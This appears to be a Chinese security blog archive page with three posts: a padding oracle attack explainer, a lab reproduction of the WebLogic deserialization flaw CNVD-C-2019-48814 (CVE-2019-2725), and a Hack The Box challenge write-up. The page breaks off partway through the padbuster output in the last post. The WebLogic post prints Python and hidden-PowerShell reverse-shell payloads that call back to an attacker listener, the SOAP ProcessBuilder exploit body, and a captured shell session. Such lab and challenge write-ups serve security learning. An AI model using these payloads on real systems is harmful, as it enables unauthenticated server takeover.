<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>第 2 页 | </title>

  
  <meta name="author" content="damn1t">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content=""/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/"></a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">主页</a></li>
      
        <li><a href="/archives">归档</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/04/vulnerable/padding oracle attack/"><span>padding oracle</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/04/vulnerable/padding oracle attack/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-04T07:32:49.409Z">
          2019-05-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="padding-oracle"><a href="#padding-oracle" class="headerlink" title="padding oracle"></a>padding oracle</h1><h2 id="什么是padding"><a href="#什么是padding" class="headerlink" title="什么是padding"></a>什么是padding</h2><p>在<a href="https://www.jianshu.com/p/b63095c59361" target="_blank" rel="noopener">分组加密</a>模式下，通常会将明文进行固定分组划分，如一组8bytes，通常会有一种情况就是明文长度非8的整数倍，那么这里就需要进行填充，这个时候，普遍的做法是在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充0x03。</p>
<p>分组长度：<br><img src="https://images0.cnblogs.com/blog/532548/201310/27190710-09a64c1721a54d0a929fbcb16700f087.png" alt=""></p>
<p>填充规则：<br><img src="https://images0.cnblogs.com/blog/532548/201310/27203056-6ebc195bd8624a3f84c547570ef1027e.png" alt=""></p>
<p>遵循规则为（常见为）<strong>PKCS#5标准</strong>：<a href="http://www.di-mgt.com.au/cryptopad.html#PKCS5" target="_blank" rel="noopener">http://www.di-mgt.com.au/cryptopad.html#PKCS5</a></p>
<h2 id="cbc模式"><a href="#cbc模式" class="headerlink" title="cbc模式"></a>cbc模式</h2><p>加密：<br><img src="https://img-blog.csdn.net/20160405180943506?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""><br>解密：<br><img src="https://img-blog.csdn.net/20160405180951038?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>
<p>详细过程：</p>
<blockquote>
<p>加密步骤如下：</p>
<p>1）首先将数据按照8个字节一组进行分组得到D1D2……Dn（若数据不是8的整数倍，用指定的PADDING数据补位）</p>
<p>2）第一组数据D1与初始化向量I异或后的结果进行DES加密得到第一组密文C1（初始化向量I为全零）</p>
<p>3）第二组数据D2与第一组的加密结果C1异或以后的结果进行DES加密，得到第二组密文C2</p>
<p>4）之后的数据以此类推，得到Cn</p>
<p>5）按顺序连为C1C2C3……Cn即为加密结果。</p>
<p>解密是加密的逆过程，步骤如下：</p>
<p>1）首先将数据按照8个字节一组进行分组得到C1C2C3……Cn</p>
<p>2）将第一组数据进行解密后与初始化向量I进行异或得到第一组明文D1（注意：一定是先解密再异或）</p>
<p>3）将第二组数据C2进行解密后与第一组密文数据进行异或得到第二组数据D2</p>
<p>4）之后依此类推，得到Dn</p>
<p>5）按顺序连为D1D2D3……Dn即为解密结果。</p>
<p>这里注意一点，解密的结果并不一定是我们原来的加密数据，可能还含有你补得位，一定要把补位去掉才是你的原来的数据。</p>
<p>特点：</p>
<ol>
<li>不容易主动攻击,安全性好于ECB,适合传输长度长的报文,是SSL、IPSec的标准。<br>each ciphertext block depends on all message blocks/每个密文块依赖于所有的信息块<br>thus a change in the message affects all ciphertext blocks/明文消息中一个改变会影响所有密文块</li>
<li>need Initial Vector (IV) known to sender &amp; receiver/发送方和接收方都需要知道初始化向量<br>3.加密过程是串行的，无法被并行化(在解密时，从两个邻接的密文块中即可得到一个平文块。因此，解密过程可以被并行化)。</li>
</ol>
</blockquote>
<h2 id="padding-oracle-attack"><a href="#padding-oracle-attack" class="headerlink" title="padding oracle attack"></a>padding oracle attack</h2><p>这可以理解为是<a href="http://en.wikipedia.org/wiki/Side_channel_attack" target="_blank" rel="noopener">侧信道攻击</a>的一种利用。<br>作为攻击者我们可以控制的只有初始化向量iv和密文cipher。<br>利用点：</p>
<blockquote>
<p>明文分组和填充就是 Padding Oracle Attack 的根源所在，但是这些需要一个前提，<br>那就是应用程序对异常的处理。当提交的加密后的数据中出现错误的填充信息时，<br>不够健壮的应用程序解密时报错，直接抛出“填充错误”异常信息。</p>
<p>攻击者就是利用这个异常来做一些事情，假设有这样一个场景，一个 WEB 程序<br>接受一个加密后的字符串作为参数，这个参数包含用户名、公司 ID 和角色 ID。<br>参数加密使用的最安全的 CBC 模式，每一个 block 有一个初始化向量。当提交参<br>数时，服务端的返回结果会有下面 3 种情况：</p>
<p>a. 参数是一串正确的密文，分组、填充、加密都是对的，包含的内容也是正确<br>的，那么服务端解密、检测用户权限都没有问题，返回 HTTP 200。</p>
<p>b. 参数是一串错误的密文，包含丌正确的 bit 填充，那么服务端解密时就会抛出<br>异常，返回 HTTP 500 server error。</p>
<p>c. 参数是一串正确的密文，包含的用户名是错误的，那么服务端解密之后检测<br>权限不通过，但是依旧会返回 HTTP 200 戒者 HTTP 302，而不是 HTTP 500。<br>攻击者无需关心用户名是否正确，只需要提交错误的密文，根据 HTTP Code 即可<br>做出攻击。根据应用程序的状态码在不知道密钥的情况下一个 bit 一个 bit 的猜<br>解出密文对应的明文，也可以伪造出任意明文加密后的密文。</p>
</blockquote>
<p>所以一句话，根据服务端响应状态码进行暴力猜解；另一方面，cbc模式下每一分组的密文或明文都与上一分组有关，所以有时这个破解会是一个耗时的过程</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>利用工具：<br><a href="https://github.com/GDSSecurity/PadBuster" target="_blank" rel="noopener">https://github.com/GDSSecurity/PadBuster</a></p>
<p>分组加解密实现demo：<br><a href="http://pan.baidu.com/s/1eitwK" target="_blank" rel="noopener">http://pan.baidu.com/s/1eitwK</a></p>
<p>参考：<br><a href="https://www.cnblogs.com/LittleHann/p/3391393.html" target="_blank" rel="noopener">https://www.cnblogs.com/LittleHann/p/3391393.html</a><br><a href="http://www.cnblogs.com/yanzi-meng/p/9640578.html" target="_blank" rel="noopener">http://www.cnblogs.com/yanzi-meng/p/9640578.html</a><br><a href="http://www.blogsir.com.cn/safe/498.html" target="_blank" rel="noopener">http://www.blogsir.com.cn/safe/498.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/side-attack/">side attack</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/04/cve/CNVD-C-2019-48814/"><span>CNVD-C-2019-48814</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/04/cve/CNVD-C-2019-48814/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-04T06:48:38.778Z">
          2019-05-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="CNVD-C-2019-48814复现"><a href="#CNVD-C-2019-48814复现" class="headerlink" title="CNVD-C-2019-48814复现"></a>CNVD-C-2019-48814复现</h1><p>docker搭建环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull ismaleiva90/weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest</span><br><span class="line">http://localhost:49163/console</span><br><span class="line">User: weblogic</span><br><span class="line">Pass: welcome1</span><br></pre></td></tr></table></figure></p>
<p>漏洞验证：登入-&gt;<a href="http://xx.xx.xx.xxx:49163/_async/AsyncResponseService" target="_blank" rel="noopener">http://xx.xx.xx.xxx:49163/_async/AsyncResponseService</a><br><img src="https://images.seebug.org/content/images/2019/05/01/1556688743000-3.png-w331s" alt=""><br>若出现如上述页面则可确定漏洞基本存在</p>
<p>poc：<a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a><br>验证方式：<br>在攻击机开启本地监听，<code>nc -lvvp 2333</code><br>调用脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py -l 192.168.10.144 -p 2333 -r http://192.168.10.145:49163</span><br></pre></td></tr></table></figure></p>
<p>这里似乎如果将监听地址写为<code>127.0.0.1</code>是不行的，只能改为在内网中的地址，拿到shell</p>
<blockquote>
<p>listening on [any] 2333 …<br>192.168.10.145: inverse host lookup failed: Unknown host<br>connect to [192.168.10.144] from (UNKNOWN) [192.168.10.145] 36844<br>sh: no job control in this shell<br>sh-4.2$ whoami<br>whoami<br>oracle<br>sh-4.2$ ls<br>ls<br>autodeploy<br>bin<br>common<br>config<br>console-ext<br>derby.log<br>fileRealm.properties<br>init-info<br>lib<br>nodemanager<br>security<br>servers<br>startWebLogic.sh<br>sh-4.2$ </p>
</blockquote>
<p>漏洞描述：</p>
<blockquote>
<p>Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services). Supported versions that are affected are 10.3.6.0.0 and 12.1.3.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server</p>
</blockquote>
<p>poc分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def __init__(self, check, rhost, lhost, lport, windows):</span><br></pre></td></tr></table></figure></p>
<p>url检查，测定漏洞点存在与否<br>目标地址，监听地址和端口<br><strong>windows</strong>则是检查目标的操作系统，默认为unix，若为windows则要添加参数<br>unix或linux下的shell生成方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.cmd_payload = (</span><br><span class="line">    &quot;python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.&quot;</span><br><span class="line">    &quot;SOCK_STREAM);s.connect((\&quot;&#123;lhost&#125;\&quot;,&#123;lport&#125;));os.dup2(s.fileno(),0); os.dup2(&quot;</span><br><span class="line">    &quot;s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;&quot;</span><br><span class="line">).format(lhost=self.lhost, lport=self.lport)</span><br></pre></td></tr></table></figure></p>
<p>windows下shell生成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">self.cmd_payload = (</span><br><span class="line">    r&quot;powershell -w hidden -nop -c function RSC&#123;if ($c.Connected -eq $true) &quot;</span><br><span class="line">    r&quot;&#123;$c.Close()&#125;;if ($p.ExitCode -ne $null) &#123;$p.Close()&#125;;exit;&#125;;$a=&apos;&quot; + self.lhost +&quot;&quot;</span><br><span class="line">    r&quot;&apos;;$p=&apos;&quot;+ self.lport + &quot;&apos;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a&quot;</span><br><span class="line">    r&quot;,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;&quot;</span><br><span class="line">    r&quot;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&apos;cmd.exe&apos;;&quot;</span><br><span class="line">    r&quot;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;&quot;</span><br><span class="line">    r&quot;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;&quot;</span><br><span class="line">    r&quot;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;&quot;</span><br><span class="line">    r&quot;while($os.Peek() -ne -1)&#123;$o += $e.GetString($os.Read())&#125;;&quot;</span><br><span class="line">    r&quot;$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;&quot;</span><br><span class="line">    r&quot;while (-not $d) &#123;if ($c.Connected -ne $true) &#123;RSC&#125;;$pos=0;$i=1; while (($i -gt 0)&quot;</span><br><span class="line">    r&quot; -and ($pos -lt $nb.Length)) &#123;$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;&quot;</span><br><span class="line">    r&quot;if (-not $pos -or $pos -eq 0) &#123;RSC&#125;;if ($nb[0..$($pos-1)] -contains 10) &#123;break&#125;&#125;;&quot;</span><br><span class="line">    r&quot;if ($pos -gt 0)&#123;$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if &quot;</span><br><span class="line">    r&quot;($p.ExitCode -ne $null)&#123;RSC&#125;else&#123;$o=$e.GetString($os.Read());while($os.Peek() -ne&quot;</span><br><span class="line">    r&quot; -1)&#123;$o += $e.GetString($os.Read());if ($o -eq $str) &#123;$o=&apos;&apos;&#125;&#125;;$s.Write($e.&quot;</span><br><span class="line">    r&quot;GetBytes($o),0,$o.length);$o=$null;$str=$null&#125;&#125;else&#123;RSC&#125;&#125;;&quot;</span><br></pre></td></tr></table></figure></p>
<p>exp部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def get_process_builder_payload(self):</span><br><span class="line">        process_builder_payload = &apos;&apos;&apos;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">    &lt;soapenv:Header&gt; </span><br><span class="line">        &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">        &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">                    &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_base&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                    &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_opt&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                    &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_payload&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                &lt;/array&gt;</span><br><span class="line">            &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">    &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;&apos;&apos;&apos;</span><br><span class="line">        return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),</span><br><span class="line">                                      cmd_payload=self.cmd_payload)</span><br></pre></td></tr></table></figure></p>
<p>执行的具体流程：<br><img src="https://images.seebug.org/content/images/2019/05/01/1556688745000-25.png-w331s" alt=""></p>
<p>分析参考：<br><a href="https://paper.seebug.org/909/#417" target="_blank" rel="noopener">https://paper.seebug.org/909/#417</a><br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725</a><br><a href="http://pupiles.com/xmldecoder.html" target="_blank" rel="noopener">http://pupiles.com/xmldecoder.html</a></p>
<p>复现参考：<br><a href="https://www.o2oxy.cn/2204.html" target="_blank" rel="noopener">https://www.o2oxy.cn/2204.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/cve/">cve</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/03/靶机/hack the box邀请码获取和web challenge/"><span>hack the box邀请码获取和web challenge</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/03/靶机/hack the box邀请码获取和web challenge/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-03T04:36:24.475Z">
          2019-05-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="hack-the-box邀请码获取和web-challenge"><a href="#hack-the-box邀请码获取和web-challenge" class="headerlink" title="hack the box邀请码获取和web challenge"></a>hack the box邀请码获取和web challenge</h1><h2 id="hack-the-box邀请码获取"><a href="#hack-the-box邀请码获取" class="headerlink" title="hack the box邀请码获取"></a>hack the box邀请码获取</h2><p>在invite code页面输入，<code>makeInvitecode</code>，显示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ƒ makeInviteCode()&#123;$.ajax(&#123;type:&quot;POST&quot;,dataType:&quot;json&quot;,url:&apos;/api/invite/how/to/generate&apos;,success:function(response)&#123;console.log(response)&#125;,error:function(response)&#123;console.log(response)&#125;&#125;)&#125;</span><br></pre></td></tr></table></figure></p>
<p>于是输入<code>makeInviteCode()</code>，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;0: 200, success: 1, data: &#123;…&#125;&#125;</span><br><span class="line">0: 200</span><br><span class="line">data:</span><br><span class="line">data: &quot;&lt;mysecret&gt;&quot;</span><br><span class="line">enctype: &quot;BASE64&quot;</span><br><span class="line">__proto__: Object</span><br><span class="line">success: 1</span><br><span class="line">__proto__: Object</span><br></pre></td></tr></table></figure></p>
<p>base64解码：</p>
<blockquote>
<p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
</blockquote>
<p>利用curl协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v https://www.hackthebox.eu/api/invite/generate -XPOST</span><br></pre></td></tr></table></figure></p>
<p>成功得到，然后将其base64解码</p>
<h2 id="web-challenge"><a href="#web-challenge" class="headerlink" title="web challenge"></a>web challenge</h2><h3 id="HDC"><a href="#HDC" class="headerlink" title="HDC"></a>HDC</h3><p>我傻了，看请求，爆目录，都无果，最后注意到引用的jquery-3.2.1似乎有问题，利用<a href="http://www.matools.com/compare" target="_blank" rel="noopener">代码比对</a>，发现多了一块，再多出的这块代码开头发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function doProcess() </span><br><span class="line">&#123;var form=document.createElement(&quot;form&quot;);	form.setAttribute(&quot;method&quot;,&quot;post&quot;);	form.setAttribute(&quot;action&quot;,&quot;main/index.php&quot;);	form.setAttribute(&quot;target&quot;,&quot;view&quot;);	var hiddenField=document.createElement(&quot;input&quot;);	hiddenField.setAttribute(&quot;type&quot;,&quot;hidden&quot;);	hiddenField.setAttribute(&quot;name&quot;,&quot;name1&quot;);	hiddenField.setAttribute(&quot;value&quot;,&quot;TXlMaXR0bGU&quot;);	var hiddenField2=document.createElement(&quot;input&quot;);	hiddenField2.setAttribute(&quot;type&quot;,&quot;hidden&quot;);	hiddenField2.setAttribute(&quot;name&quot;,&quot;name2&quot;);	hiddenField2.setAttribute(&quot;value&quot;,&quot;cDB3bmll&quot;);	form.appendChild(hiddenField2);		form.appendChild(hiddenField);	form.appendChild(hiddenField2);	document.body.appendChild(form);			window.open(&apos;&apos;,&apos;view&apos;);	form.submit();&#125;</span><br></pre></td></tr></table></figure></p>
<p>有两个值：<code>TXlMaXR0bGU</code>，<code>cDB3bmll</code>，成功登入<br>界面如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919190644-17ffa23a-bbfc-1.png" alt=""><br>在mailbox发现了一个检索框但无法点击，检查元素，发现了图片地址<strong>./_secret<em>area</em>/mails.gif</strong>，于是尝试进入<strong>_secret<em>area</em></strong>目录，找到了邮箱：</p>
<blockquote>
<h2 id="All-good-boys-are-here…-hehehehehehe"><a href="#All-good-boys-are-here…-hehehehehehe" class="headerlink" title="All good boys are here… hehehehehehe!"></a>All good boys are here… hehehehehehe!</h2><p>Peter Punk CallMePink@newmail.com<br>Nabuchodonosor BabyNavou@mailpost.gr<br>Ilias Magkakos imagkakos@badmail.com<br>Nick Pipshow NickTheGreek@mail.tr.gr<br>Don Quixote Windmill@mail.gr<br>Crazy Priest SeVaftise@hotmail.com<br>Fishroe Salad fishroesalad@mail.com<br>TaPanta Ola OlaMaziLeme@mail.gr<br>Laertis George I8aki@mail.gr<br>Thiseas Sparrow Pirates@mail.gr<br>Black Dreamer SupaHacka@mail.com<br>Callme Daddy FuckthemALL@mail.com<br>Aggeliki Lykolouli FwsStoTounel@Traino.pourxetai<br>Kompinadoros Yannnnis YannisWith4N@rolf.com<br>Serafino Titamola Ombrax@mail.gr<br>Joe Hard Soft@Butter.gr<br>Bond James MyNameIsBond@JamesBond.com<br>Endof Text EndOfLine@mail.com</p>
</blockquote>
<p>再回看题目要求：</p>
<blockquote>
<p>Can you find out who that is and send him an email to check</p>
</blockquote>
<p>所以挨个发送请求，用intruder<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919190721-2e3fb954-bbfc-1.png" alt=""></p>
<h3 id="I-know-Mag1k"><a href="#I-know-Mag1k" class="headerlink" title="I know Mag1k"></a>I know Mag1k</h3><blockquote>
<p>Can you get to the profile page of the admin?</p>
</blockquote>
<p>不像sql注入，也没有限定admin，利用admin用户名注册一个人账户发现没有什么东西<br><img src="https://i.imgur.com/OoVd8ib.png" alt=""></p>
<p>这时关注cookie，有一个可疑字段：</p>
<blockquote>
<p>iknowmag1k:82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D</p>
</blockquote>
<p>查询一番，发现是<a href="https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html" target="_blank" rel="noopener">padding Oracle</a><br>，准备在另一篇文章详解<br>可以利用padbuster，在kali上自带，可能是网络的原因，也可能是垃圾电脑的原因，跑了很久：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# padbuster http://docker.hackthebox.eu:42414/profile.php 82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D 8 --cookie &quot;iknowmag1k=82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D;PHPSESSID=qevph0jf0hlskfkr0atq1kj1b3&quot;</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N/A</span><br><span class="line">[+] Content Length: 3844</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Decrypt Mode</span><br><span class="line">*** Starting Block 1 of 4 ***</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#	Freq	Status	Length	Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1	1	200	3844	N/A</span><br><span class="line">2 **	255	500	2203	N/A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (63/256) [Byte 8]</span><br><span class="line">[+] Success: (150/256) [Byte 7]</span><br><span class="line">[+] Success: (129/256) [Byte 6]</span><br><span class="line">ERROR: No matching response on [Byte 5]</span><br><span class="line">       Automatically trying one more time...</span><br><span class="line">[+] Success: (223/256) [Byte 8]</span><br><span class="line">[+] Success: (10/256) [Byte 7]</span><br><span class="line">ERROR: No matching response on [Byte 6]</span><br><span class="line">Do you want to start this block over? (Yes/No)? [y/n/a] : y</span><br><span class="line">INFO: Switching to interactive mode</span><br><span 